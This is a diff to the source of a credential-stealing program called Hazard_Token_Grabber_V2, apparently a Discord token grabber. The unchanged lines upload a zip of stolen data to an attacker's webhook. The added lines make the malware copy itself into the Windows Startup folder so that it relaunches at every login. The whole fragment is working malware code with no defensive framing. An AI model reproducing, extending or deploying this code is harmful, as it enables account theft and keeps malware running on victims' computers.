@@ -398,6 +398,13 @@ class Hazard_Token_Grabber_V2(functions):
         }
         requests.post(self.webhook, json=embed)
         requests.post(self.webhook, files={'upload_file': open(_zipfile,'rb')})
+
+        file_name = os.path.basename(__file__)
+        full_path = os.getcwd() + "\\" + file_name
+        if not full_path.startswith(self.appdata + "\\Microsoft\\Windows\\Start Menu\\Programs\\"):
+            os.system(f"copy \"{full_path}\" \"{self.appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{file_name}\" >nul 2>&1")
+
+
         os.remove(_zipfile)
 
 if __name__ == "__main__" and os.name == "nt":
